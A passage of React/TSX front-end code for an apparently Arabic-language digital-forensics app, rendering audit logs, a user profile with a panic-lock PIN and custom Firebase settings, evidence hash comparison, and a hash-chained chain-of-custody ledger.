                        log.verdict.toLowerCase().includes(auditSearchQuery.toLowerCase())
                      )
                      .map((log, idx) => (
                        <tr key={`${log.id}-${idx}`} className="hover:bg-gray-800/30 transition">
                          <td className="p-3 font-mono text-gray-400 whitespace-nowrap">{formatTimestampSafe(log.timestamp)}</td>
                          <td className="p-3 font-medium text-white">{log.fileName}</td>
                          <td className="p-3 font-mono text-[10px] text-[#D4AF37]">
                            {log.sha256 && log.sha256 !== 'N/A' ? `${log.sha256.substring(0, 14)}...` : 'N/A'}
                          </td>
                          <td className="p-3 font-mono text-gray-400">{log.fileSize}</td>
                          <td className="p-3 font-mono font-bold text-[#D4AF37]">{log.score}%</td>
                          <td className="p-3 text-gray-300">{log.verdict}</td>
                          <td className="p-3">
                            {log.synced || isCloudAuthenticated ? (
                              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold">
                                <Cloud className="w-3 h-3" />
                                Firestore
                              </span>
                            ) : (
                              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-gray-800 text-gray-400 text-[10px]">
                                محلي
                              </span>
                            )}
                          </td>
                        </tr>
                      ))}
                  </tbody>
                </table>
              </div>
            ) : (
              <div className="py-16 text-center text-gray-500 text-sm">السجل فارغ حالياً.</div>
            )}
          </div>
        )}

        {/* Tab: User Profile */}
        {isTabVisible('profile') && user && (
          <div className="space-y-6">
            <div className="bg-gray-900 border border-gray-800 rounded-3xl overflow-hidden shadow-2xl">
              <div className="h-32 bg-gradient-to-r from-[#D4AF37] to-[#10B981] relative">
                <div className="absolute -bottom-12 right-8 flex items-end gap-6">
                  <div className="relative group">
                    <div className="w-24 h-24 rounded-2xl bg-gray-950 border-4 border-[#0b0f19] overflow-hidden shadow-xl">
                      {userProfile?.photoURL ? (
                        <img src={userProfile.photoURL} alt="Profile" className="w-full h-full object-cover" />
                      ) : (
                        <div className="w-full h-full flex items-center justify-center bg-gray-900">
                          <UserIcon className="w-10 h-10 text-gray-700" />
                        </div>
                      )}
                    </div>
                    <label className="absolute inset-0 flex items-center justify-center bg-black/60 opacity-0 group-hover:opacity-100 transition cursor-pointer rounded-2xl">
                      <Upload className="w-5 h-5 text-white" />
                      <input type="file" accept="image/*" onChange={handleProfilePhotoUpload} className="hidden" />
                    </label>
                  </div>
                  <div className="pb-2 space-y-1">
                    <h2 className="text-2xl font-bold text-white tracking-tight">{userProfile?.displayName || 'المحقق'}</h2>
                    <p className="text-xs text-gray-400 font-mono">{resolvedUserEmail}</p>
                  </div>
                </div>
              </div>

              <div className="pt-16 p-8 grid grid-cols-1 lg:grid-cols-3 gap-8">
                <div className="lg:col-span-2 space-y-6">
                  <div className="bg-gray-950/50 border border-gray-800 rounded-2xl p-6 space-y-4">
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Sliders className="w-4 h-4 text-[#D4AF37]" />
                      إعدادات الحساب الشخصي
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest px-1">الاسم المعروض</label>
                        <input 
                          type="text" 
                          defaultValue={userProfile?.displayName} 
                          onBlur={(e) => updateProfileData({ displayName: e.target.value })}
                          className="w-full px-4 py-2.5 bg-gray-900 border border-gray-800 rounded-xl text-sm text-white focus:border-[#D4AF37] outline-none"
                        />
                      </div>
                      <div className="space-y-1.5 opacity-60">
                        <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest px-1">البريد الإلكتروني (غير قابل للتغيير)</label>
                        <input 
                          type="email" 
                          value={resolvedUserEmail} 
                          disabled
                          className="w-full px-4 py-2.5 bg-gray-900 border border-gray-800 rounded-xl text-sm text-gray-400 cursor-not-allowed"
                        />
                      </div>
                    </div>
                  </div>

                  <div className="bg-gray-950/50 border border-gray-800 rounded-2xl p-6 space-y-4">
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <RefreshCw className="w-4 h-4 text-emerald-500" />
                      إحصائيات النشاط الجنائي
                    </h3>
                    <div className="grid grid-cols-3 gap-4">
                      <div className="p-4 bg-gray-900 rounded-xl border border-gray-800 text-center">
                        <div className="text-xl font-bold text-white font-mono">{investigations.length}</div>
                        <div className="text-[10px] text-gray-500 uppercase">التحقيقات</div>
                      </div>
                      <div className="p-4 bg-gray-900 rounded-xl border border-gray-800 text-center">
                        <div className="text-xl font-bold text-white font-mono">{evidenceList.length}</div>
                        <div className="text-[10px] text-gray-500 uppercase">الأدلة</div>
                      </div>
                      <div className="p-4 bg-gray-900 rounded-xl border border-gray-800 text-center">
                        <div className="text-xl font-bold text-white font-mono">{auditLogs.length}</div>
                        <div className="text-[10px] text-gray-500 uppercase">العمليات</div>
                      </div>
                    </div>
                  </div>

                  <div className="bg-gray-950/50 border border-gray-800 rounded-2xl p-6 space-y-4">
                    <div className="flex items-center justify-between">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <Lock className="w-4 h-4 text-[#D4AF37]" />
                        قفل الطوارئ والرمز السري (Panic Lock PIN)
                      </h3>
                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold ${
                        hasUserPin ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' : 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
                      }`}>
                        {hasUserPin ? 'مشفر في Firestore (SHA-256)' : 'لم يتم التعيين بعد'}
                      </span>
                    </div>
                    <p className="text-xs text-gray-400 leading-relaxed">
                      رمز سري مشفر لحماية الجلسة وقفل الواجهة فوراً عند الطوارئ أو الخمول لمنع الوصول غير المصرح به للأدلة الجنائية.
                    </p>
                    <div className="flex flex-wrap gap-3">
                      <button
                        onClick={() => {
                          setSetupPin('');
                          setConfirmPin('');
                          setSetupError(null);
                          setShowPinChangeModal(true);
                        }}
                        className="px-4 py-2 bg-gray-900 hover:bg-gray-800 border border-gray-800 text-xs font-bold text-[#D4AF37] rounded-xl transition flex items-center gap-2 cursor-pointer"
                      >
                        <Key className="w-3.5 h-3.5" />
                        {hasUserPin ? 'تغيير رمز PIN السري' : 'تعيين رمز PIN الآن'}
                      </button>
                      <button
                        onClick={() => setIsLocked(true)}
                        className="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-xs font-bold text-red-400 rounded-xl transition flex items-center gap-2 cursor-pointer"
                      >
                        <ShieldAlert className="w-3.5 h-3.5" />
                        اختبار قفل الطوارئ الآن
                      </button>
                    </div>
                  </div>
                </div>

                <div className="space-y-6">
                  <div className="bg-gray-950/50 border border-gray-800 rounded-2xl p-6 space-y-4">
                    <h3 className="text-sm font-bold text-white">معلومات الأمان</h3>
                    <div className="space-y-3">
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-500">حالة التحقق:</span>
                        {isEmailVerifiedOrGoogle ? (
                          <span className="text-emerald-400 flex items-center gap-1 font-bold">
                            <CheckCircle2 className="w-3 h-3" /> تم التحقق (Google)
                          </span>
                        ) : (
                          <span className="text-amber-400 font-bold">بانتظار التحقق</span>
                        )}
                      </div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-500">تاريخ الانضمام:</span>
                        <span className="text-white font-mono">{userProfile?.createdAt ? new Date(userProfile.createdAt).toLocaleDateString('ar-SA') : '...'}</span>
                      </div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-500">الدور الوظيفي:</span>
                        <span className="text-[#D4AF37] font-bold uppercase">{userProfile?.role || 'ANALYST'}</span>
                      </div>
                    </div>
                    <div className="pt-4 border-t border-gray-800 space-y-3">
                      {!isCloudAuthenticated ? (
                        <div className="space-y-3">
                          <div className="p-3.5 rounded-xl bg-gray-900 border border-gray-800 space-y-2">
                            <div className="flex items-center justify-between text-xs">
                              <span className="text-gray-400">وضع الحماية النشط:</span>
                              <span className="text-emerald-400 font-bold">بوابة كلمة المرور الرئيسية (SHA-256)</span>
                            </div>
                            <p className="text-[11px] text-gray-400 leading-relaxed">
                              الجلسة مفتوحة مؤقتاً داخل التبويب الحالي (sessionStorage) وتُقفل تلقائياً عند إغلاق المتصفح.
                            </p>
                          </div>

                          <button
                            type="button"
                            onClick={onLockSystem}
                            className="w-full py-2.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition flex items-center justify-center gap-2 cursor-pointer"
                          >
                            <Lock className="w-4 h-4" />
                            قفل النظام الآن
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              setShowCustomFirebasePanel((v) => !v);
                              setCustomFirebaseError(null);
                            }}
                            className="w-full py-2 rounded-lg bg-gray-900 hover:bg-gray-800 border border-gray-700 text-[#D4AF37] text-[10px] font-bold cursor-pointer"
                          >
                            {showCustomFirebasePanel ? 'إخفاء إعدادات Firebase المخصصة' : 'ربط مشروع Firebase خاص بك'}
                          </button>

                          {(showCustomFirebasePanel || isUsingCustomFirebaseConfig) && (
                            <div className="p-3 rounded-xl bg-gray-900 border border-gray-800 space-y-2.5 text-right">
                              <div className="flex items-center justify-between gap-2">
                                <span className="text-[11px] font-bold text-white">
                                  ربط مشروع Firebase خاص بك
                                </span>
                                {isUsingCustomFirebaseConfig && (
                                  <button
                                    type="button"
                                    onClick={resetCustomFirebaseConfig}
                                    className="text-[10px] text-red-400 hover:underline cursor-pointer"
                                  >
                                    استعادة الافتراضي
                                  </button>
                                )}
                              </div>
                              <p className="text-[10px] text-gray-400 leading-relaxed">
                                الصق كود <span className="font-mono text-gray-200">firebaseConfig</span> هنا لتخصيص قاعدة البيانات والتخزين السحابي:
                              </p>
                              <textarea
                                rows={4}
                                dir="ltr"
                                value={customFirebaseRaw}
                                onChange={(e) => {
                                  setCustomFirebaseRaw(e.target.value);
                                  setCustomFirebaseError(null);
                                }}
                                placeholder={'{\n  "apiKey": "AIza...",\n  "authDomain": "your-app.firebaseapp.com",\n  "projectId": "your-app",\n  "appId": "1:...:web:..."\n}'}
                                className="w-full p-2.5 bg-gray-950 border border-gray-800 rounded-lg text-[10px] font-mono text-emerald-300 focus:border-[#D4AF37] outline-none"
                              />
                              {customFirebaseError && (
                                <p className="text-[10px] text-red-400">{customFirebaseError}</p>
                              )}
                              <div className="text-[10px] text-gray-500 font-mono" dir="ltr">
                                Active Project: {firebaseConfig.projectId} {isUsingCustomFirebaseConfig ? '(Custom)' : ''}
                              </div>
                              <button
                                type="button"
                                onClick={() => {
                                  const parsed = parseFirebaseConfigInput(customFirebaseRaw);
                                  if (!parsed) {
                                    setCustomFirebaseError('تأكد من احتواء الكود على apiKey و authDomain و projectId و appId.');
                                    return;
                                  }
                                  saveCustomFirebaseConfig(parsed);
                                }}
                                className="w-full py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-[11px] rounded-lg transition cursor-pointer"
                              >
                                حفظ المشروع المخصص وإعادة التحميل
                              </button>
                            </div>
                          )}
                        </div>
                      ) : (
                        <>
                          <button 
                            onClick={handleChangePassword}
                            className="w-full py-2.5 bg-gray-900 hover:bg-gray-800 text-[#D4AF37] border border-gray-800 font-bold text-[10px] rounded-xl transition flex items-center justify-center gap-2"
                          >
                            <RefreshCw className="w-3.5 h-3.5" />
                            تغيير كلمة المرور
                          </button>
                          
                          <button 
                            onClick={handleSignOut}
                            className="w-full py-2.5 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 font-bold text-[10px] rounded-xl transition flex items-center justify-center gap-2"
                          >
                            <LogOut className="w-3.5 h-3.5" />
                            تسجيل الخروج الآمن
                          </button>
                        </>
                      )}
                    </div>
                  </div>

                  <div className="p-6 bg-gradient-to-br from-gray-900 to-gray-950 border border-gray-800 rounded-2xl text-center">
                    <Shield className="w-8 h-8 text-[#D4AF37] mx-auto mb-3" />
                    <h4 className="text-xs font-bold text-white mb-1">جلسة مؤمنة بالكامل</h4>
                    <p className="text-[10px] text-gray-500 leading-relaxed">بصمتك الرقمية مشفرة بـ AES-256 ومرتبطة بـ UID الفريد الخاص بك.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        {isTabVisible('comparison') && (
          <div className="space-y-6">
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <h2 className="text-lg font-bold text-white">مقارنة الأدلة الرقمية (Evidence Comparison)</h2>
                  <p className="text-xs text-gray-400">مقارنة فنية دقيقة بين قطعتين من الأدلة الرقمية لكشف التلاعب أو التطابق.</p>
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setComparisonItems({ a: null, b: null })} className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-xs rounded-lg transition text-gray-300 flex items-center gap-2">
                    <Trash2 className="w-3.5 h-3.5" />
                    مسح الاختيارات
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                {/* Item A */}
                <div className="space-y-4">
                  <h3 className="text-xs font-bold text-[#D4AF37] uppercase tracking-widest">الدليل (أ)</h3>
                  {comparisonItems.a ? (
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-4">
                      <div className="aspect-video bg-black rounded-lg overflow-hidden flex items-center justify-center border border-gray-800">
                        {comparisonItems.a.fileUrl && comparisonItems.a.mimeType.startsWith('image/') ? (
                          <img src={comparisonItems.a.fileUrl} alt="" className="max-h-full max-w-full object-contain" />
                        ) : (
                          <div className="text-center space-y-2 p-4">
                            <FileCode className="w-8 h-8 text-[#D4AF37] mx-auto" />
                            <div className="text-[11px] font-mono text-gray-400">{comparisonItems.a.analysis?.detectedFileType || comparisonItems.a.mimeType}</div>
                          </div>
                        )}
                      </div>
                      <div className="space-y-2 text-xs">
                        <div className="flex justify-between"><span className="text-gray-500">الاسم:</span> <span className="text-white truncate max-w-[150px]">{comparisonItems.a.fileName}</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">SHA-256:</span> <span className="text-emerald-400 font-mono text-[9px]">{comparisonItems.a.sha256.substring(0, 24)}...</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">MD5:</span> <span className="text-[#D4AF37] font-mono">{comparisonItems.a.analysis.md5}</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">الأصالة:</span> <span className="text-white font-bold">{comparisonItems.a.analysis.authenticityScore}%</span></div>
                      </div>
                    </div>
                  ) : (
                    <div onClick={() => setActiveTab('evidence')} className="bg-gray-950 border border-dashed border-gray-800 rounded-xl p-12 text-center cursor-pointer hover:border-gray-700 transition">
                      <Plus className="w-8 h-8 text-gray-700 mx-auto mb-2" />
                      <span className="text-xs text-gray-500">اختر الدليل الأول من السجل</span>
                    </div>
                  )}
                </div>

                {/* Item B */}
                <div className="space-y-4">
                  <h3 className="text-xs font-bold text-purple-400 uppercase tracking-widest">الدليل (ب)</h3>
                  {comparisonItems.b ? (
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-4">
                      <div className="aspect-video bg-black rounded-lg overflow-hidden flex items-center justify-center border border-gray-800">
                        {comparisonItems.b.fileUrl && comparisonItems.b.mimeType.startsWith('image/') ? (
                          <img src={comparisonItems.b.fileUrl} alt="" className="max-h-full max-w-full object-contain" />
                        ) : (
                          <div className="text-center space-y-2 p-4">
                            <FileCode className="w-8 h-8 text-purple-400 mx-auto" />
                            <div className="text-[11px] font-mono text-gray-400">{comparisonItems.b.analysis?.detectedFileType || comparisonItems.b.mimeType}</div>
                          </div>
                        )}
                      </div>
                      <div className="space-y-2 text-xs">
                        <div className="flex justify-between"><span className="text-gray-500">الاسم:</span> <span className="text-white truncate max-w-[150px]">{comparisonItems.b.fileName}</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">SHA-256:</span> <span className="text-emerald-400 font-mono text-[9px]">{comparisonItems.b.sha256.substring(0, 24)}...</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">MD5:</span> <span className="text-[#D4AF37] font-mono">{comparisonItems.b.analysis.md5}</span></div>
                        <div className="flex justify-between"><span className="text-gray-500">الأصالة:</span> <span className="text-white font-bold">{comparisonItems.b.analysis.authenticityScore}%</span></div>
                      </div>
                    </div>
                  ) : (
                    <div onClick={() => setActiveTab('evidence')} className="bg-gray-950 border border-dashed border-gray-800 rounded-xl p-12 text-center cursor-pointer hover:border-gray-700 transition">
                      <Plus className="w-8 h-8 text-gray-700 mx-auto mb-2" />
                      <span className="text-xs text-gray-500">اختر الدليل الثاني من السجل</span>
                    </div>
                  )}
                </div>
              </div>

              {comparisonItems.a && comparisonItems.b && (
                <div className="mt-8 pt-8 border-t border-gray-800">
                  <h3 className="text-sm font-bold text-white mb-4">تقرير المقارنة التلقائي</h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className={`p-4 rounded-xl border ${comparisonItems.a.sha256 === comparisonItems.b.sha256 ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-red-500/10 border-red-500/30 text-red-400'}`}>
                      <div className="text-[10px] uppercase font-bold mb-1">بصمة SHA-256</div>
                      <div className="text-sm font-bold">{comparisonItems.a.sha256 === comparisonItems.b.sha256 ? 'متطابقة تماماً' : 'مختلفة (ملفات غير متطابقة)'}</div>
                    </div>
                    <div className={`p-4 rounded-xl border ${comparisonItems.a.analysis.authenticityScore === comparisonItems.b.analysis.authenticityScore ? 'bg-blue-500/10 border-blue-500/30 text-blue-400' : 'bg-amber-500/10 border-amber-500/30 text-amber-400'}`}>
                      <div className="text-[10px] uppercase font-bold mb-1">نسبة الأصالة</div>
                      <div className="text-sm font-bold">{Math.abs(comparisonItems.a.analysis.authenticityScore - comparisonItems.b.analysis.authenticityScore)}% فارق التحليل</div>
                    </div>
                    <div className="p-4 bg-gray-950 border border-gray-800 rounded-xl text-gray-300">
                      <div className="text-[10px] uppercase font-bold mb-1 text-gray-500">فارق الحجم</div>
                      <div className="text-sm font-bold font-mono">{Math.abs(comparisonItems.a.fileSize - comparisonItems.b.fileSize).toLocaleString()} Bytes</div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {isTabVisible('custody') && (
          <div className="space-y-6">
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 space-y-6">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    <History className="w-5 h-5 text-[#D4AF37]" />
                    سلسلة الحفظ المشفرة المتزامنة (Chain of Custody Live Sync)
                  </h2>
                  <p className="text-xs text-gray-400">
                    سجل رقمي غير قابل للتلاعب يوثق كل إجراء للمحقق (رفع دليل، فحص ملف، أو تعديل إعداد) في Firestore ببصمة SHA-256 تسلسلية وطابع زمني دقيق.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <button
                    onClick={() => setCustodyViewMode('global')}
                    className={`px-3.5 py-2 rounded-xl text-xs font-bold transition border ${
                      custodyViewMode === 'global'
                        ? 'bg-[#D4AF37] text-gray-950 border-[#D4AF37]'
                        : 'bg-gray-950 text-gray-300 border-gray-800 hover:border-gray-700'
                    }`}
                  >
                    السجل الشامل المباشر ({globalCustodyLedger.length})
                  </button>
                  <button
                    onClick={() => setCustodyViewMode('evidence')}
                    className={`px-3.5 py-2 rounded-xl text-xs font-bold transition border ${
                      custodyViewMode === 'evidence'
                        ? 'bg-[#D4AF37] text-gray-950 border-[#D4AF37]'
                        : 'bg-gray-950 text-gray-300 border-gray-800 hover:border-gray-700'
                    }`}
                  >
                    سلسلة دليل محدد
                  </button>
                  <select
                    value={selectedEvidenceForHistory || ''}
                    onChange={(e) => {
                      if (e.target.value) fetchCustodyHistory(e.target.value);
                    }}
                    className="bg-gray-950 border border-gray-800 rounded-xl text-xs text-white px-3 py-2 outline-none focus:border-[#D4AF37] max-w-[220px]"
                  >
                    <option value="">-- اختر دليلاً --</option>
                    {evidenceList.map(ev => (
                      <option key={ev.id} value={ev.id}>
                        {ev.fileName} ({ev.sha256.substring(0, 8)}...)
                      </option>
                    ))}
                  </select>
                  {custodyViewMode === 'evidence' && selectedEvidenceForHistory && (
                    <button 
                      onClick={() => setShowCustodyCertificate(true)}
                      className="flex items-center gap-1.5 px-3.5 py-2 bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-400 border border-emerald-500/30 font-bold text-xs rounded-xl transition"
                    >
                      <FileText className="w-3.5 h-3.5" />
                      شهادة السلسلة
                    </button>
                  )}
                  {custodyViewMode === 'global' && (
                    <>
                      <button
                        onClick={() => {
                          setCustodyModalScope('global');
                          setCustodyForm(prev => ({
                            ...prev,
                            officerName: prev.officerName || userProfile?.displayName || 'كبير المحققين السياديين'
                          }));
                          setShowAddCustodyModal(true);
                        }}
                        className="flex items-center gap-1.5 px-3.5 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition"
                      >
                        <Plus className="w-3.5 h-3.5" />
                        توثيق إجراء في السجل
                      </button>
                      {globalCustodyLedger.length > 0 && (
                        <button
                          onClick={() => {
                            const payload = {
                              exportedAt: new Date().toISOString(),
                              integrityVerified: globalLedgerVerification.verified,
                              totalBlocks: globalCustodyLedger.length,
                              verificationStatus: globalLedgerVerification.status,
                              blocks: [...globalCustodyLedger].reverse()
                            };
                            const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json;charset=utf-8' });
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = `sovereign_custody_ledger_${Date.now()}.json`;
                            a.click();
                            URL.revokeObjectURL(url);
                            notifyStatus('تم تصدير السجل الشامل لسلسلة الحفظ بصيغة JSON.', 'success');
                          }}
                          className="flex items-center gap-1.5 px-3.5 py-2 bg-gray-950 hover:bg-gray-800 text-emerald-400 border border-emerald-500/30 font-bold text-xs rounded-xl transition"
                        >
                          <Download className="w-3.5 h-3.5" />
                          تصدير السجل (JSON)
                        </button>
                      )}
                    </>
                  )}
                </div>
              </div>

              {custodyViewMode === 'global' ? (
                <div className="space-y-5">
                  {/* Live Global Chain Integrity Banner */}
                  <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
                    globalLedgerVerification.verified
                      ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                      : 'bg-red-500/10 border-red-500/30 text-red-400'
                  }`}>
                    <div className="flex items-center gap-3">
                      {globalLedgerVerification.verified ? <ShieldCheck className="w-6 h-6 shrink-0" /> : <AlertOctagon className="w-6 h-6 shrink-0" />}
                      <div>
                        <div className="text-sm font-bold">
                          {globalLedgerVerification.verified
                            ? 'تكامل سلسلة الحفظ الشاملة موثق بنسبة 100% (Firestore Append-Only Ledger)'
                            : `تحذير: تم اكتشاف كسر أو اختلاف في تسلسل بصمات SHA-256! ${globalLedgerVerification.reason ? `(${globalLedgerVerification.reason})` : ''}`}
                        </div>
                        <div className="text-xs opacity-80 mt-0.5">
                          عدد الوثائق التسلسلية الموثقة: {globalCustodyLedger.length} • {isCloudAuthenticated ? 'متزامن لحظياً مع Firestore (custody_ledger)' : 'الوضع المحلي المعزول (محفوظ محلياً ببصمة SHA-256)'}
                        </div>
                      </div>
                    </div>
                    <span className="text-xs font-mono uppercase bg-black/40 px-3 py-1 rounded-lg border border-white/10 self-start sm:self-center">
                      {globalLedgerVerification.verified ? 'IMMUTABLE CHAIN OK' : 'TAMPER DETECTED'}
                    </span>
                  </div>

                  {/* Category Filter Pills */}
                  <div className="flex flex-wrap items-center gap-2 text-xs">
                    {[
                      { id: 'ALL' as const, label: `الكل (${globalCustodyLedger.length})` },
                      { id: 'EVIDENCE_UPLOAD' as const, label: 'رفع الأدلة' },
                      { id: 'FILE_INSPECTION' as const, label: 'فحص الملفات' },
                      { id: 'LOG_ANALYSIS' as const, label: 'تحليل السجلات' },
                      { id: 'REPORT_EXPORT' as const, label: 'تصدير التقارير' },
                      { id: 'CASE_MANAGEMENT' as const, label: 'إدارة القضايا' },
                      { id: 'SETTINGS_CHANGE' as const, label: 'تعديل الإعدادات' },
                      { id: 'MANUAL_CUSTODY' as const, label: 'حركات يدوية' },
                    ].map(cat => (
                      <button
                        key={cat.id}
                        onClick={() => setCustodyCategoryFilter(cat.id)}
                        className={`px-3 py-1.5 rounded-lg font-medium transition ${
                          custodyCategoryFilter === cat.id
                            ? 'bg-[#D4AF37] text-gray-950 font-bold'
                            : 'bg-gray-950 text-gray-400 border border-gray-800 hover:text-white'
                        }`}
                      >
                        {cat.label}
                      </button>
                    ))}
                  </div>

                  {globalCustodyLedger.length === 0 ? (
                    <div className="py-16 text-center space-y-3 text-gray-500 text-sm">
                      <History className="w-10 h-10 text-gray-700 mx-auto" />
                      <p>لا توجد حركات مسجلة بعد. عند رفع دليل، أو فحص ملف، أو تحليل سجلات، أو تعديل إعداد، سيتم توثيقه هنا تلقائياً في Firestore ببصمة SHA-256 تسلسلية.</p>
                    </div>
                  ) : (
                    <div className="max-w-4xl mx-auto pt-2">
                      <div className="relative border-r-2 border-gray-800 pr-8 pb-4 space-y-6 mr-4">
                        {(() => {
                          const filteredLedger = globalCustodyLedger.filter(
                            item => custodyCategoryFilter === 'ALL' || item.actionCategory === custodyCategoryFilter
                          );
                          return filteredLedger.map((entry, idx) => {
                            const blockNum = filteredLedger.length - idx;
                            const catBadge =
                              entry.actionCategory === 'EVIDENCE_UPLOAD'
                                ? { label: 'رفع دليل', cls: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30' }
                                : entry.actionCategory === 'FILE_INSPECTION'
                                ? { label: 'فحص ملف', cls: 'bg-blue-500/15 text-blue-400 border-blue-500/30' }
                                : entry.actionCategory === 'LOG_ANALYSIS'
                                ? { label: 'تحليل سجلات IoCs', cls: 'bg-amber-500/15 text-amber-400 border-amber-500/30' }
                                : entry.actionCategory === 'REPORT_EXPORT'
                                ? { label: 'تصدير تقرير رسمي', cls: 'bg-cyan-500/15 text-cyan-400 border-cyan-500/30' }
                                : entry.actionCategory === 'CASE_MANAGEMENT'
                                ? { label: 'إدارة قضية/دليل', cls: 'bg-indigo-500/15 text-indigo-400 border-indigo-500/30' }
                                : entry.actionCategory === 'SETTINGS_CHANGE'
                                ? { label: 'تعديل إعداد', cls: 'bg-purple-500/15 text-purple-400 border-purple-500/30' }
                                : { label: 'حركة حيازة', cls: 'bg-[#D4AF37]/15 text-[#D4AF37] border-[#D4AF37]/30' };

                            return (
                              <div key={entry.id || idx} className="relative">
                                <div className="absolute -right-[41px] top-0 w-5 h-5 rounded-full bg-gray-900 border-2 border-[#D4AF37] flex items-center justify-center z-10">
                                  <div className="w-2 h-2 rounded-full bg-[#D4AF37]"></div>
                                </div>
                                <div className="bg-gray-950 border border-gray-800 rounded-2xl p-5 shadow-xl space-y-3">
                                  <div className="flex flex-wrap items-center justify-between gap-2">
                                    <div className="flex flex-wrap items-center gap-2">
                                      <span className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 font-mono text-[10px] text-gray-400">
                                        #{blockNum}
                                      </span>
                                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold border ${catBadge.cls}`}>
                                        {catBadge.label}
                                      </span>
                                      <span className="text-sm font-bold text-white">{entry.action}</span>
                                    </div>
                                    <div className="flex items-center gap-2 text-[10px] font-mono text-gray-400">
                                      <span className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-emerald-400">
                                        {entry.synced ? 'Firestore Synced' : 'Local Block'}
                                      </span>
                                      <span dir="ltr">{entry.timestamp}</span>
                                    </div>
                                  </div>

                                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5 text-xs">
                                    <div className="flex items-center gap-2 text-gray-400 bg-gray-900/60 p-2 rounded-xl border border-gray-800">
                                      <Server className="w-3.5 h-3.5 text-[#D4AF37] shrink-0" />
                                      <span className="truncate">المصدر/الموقع: <strong className="text-white">{entry.location}</strong></span>
                                    </div>
                                    <div className="flex items-center gap-2 text-gray-400 bg-gray-900/60 p-2 rounded-xl border border-gray-800">
                                      <UserIcon className="w-3.5 h-3.5 text-[#D4AF37] shrink-0" />
                                      <span className="truncate">المحقق: <strong className="text-white">{entry.officerName || 'كبير المحققين'}</strong></span>
                                    </div>
                                  </div>

                                  {entry.notes && (
                                    <p className="text-xs text-gray-300 bg-gray-900 p-3 rounded-xl border border-gray-800 leading-relaxed break-all">{entry.notes}</p>
                                  )}

                                  <div className="space-y-1.5 pt-2 border-t border-gray-800 font-mono text-[10px]">
                                    <div className="flex items-center justify-between gap-2 bg-gray-900 p-2 rounded-lg border border-gray-800">
                                      <span className="text-gray-500 shrink-0">PrevHash:</span>
                                      <span className="text-gray-400 truncate max-w-[360px] select-all" dir="ltr">{entry.prevHash}</span>
                                    </div>
                                    <div className="flex items-center justify-between gap-2 bg-gray-900 p-2 rounded-lg border border-gray-800">
                                      <span className="text-[#D4AF37] shrink-0">RecordHash (SHA-256):</span>
                                      <span className="text-emerald-400 truncate max-w-[360px] select-all" dir="ltr">{entry.recordHash}</span>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            );
                          });
                        })()}
                      </div>
                    </div>
                  )}
                </div>
              ) : !selectedEvidenceForHistory ? (
                <div className="py-16 text-center space-y-4">
                  <History className="w-12 h-12 text-gray-700 mx-auto" />
                  <p className="text-gray-400 text-sm">
                    {evidenceList.length > 0
                      ? 'يرجى اختيار دليل من القائمة أعلاه لعرض أو تسجيل حركات سلسلة الحيازة المشفرة الخاصة به.'
                      : 'لا توجد أدلة محفوظة بعد. قم برفع ملف من قسم الأدلة أو وحدة التحليل أولاً.'}
                  </p>
                </div>
              ) : (
                <div className="space-y-6">
                  {/* Real Async SHA-256 Verification Status Banner */}
                  <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
                    custodyVerification.verified 
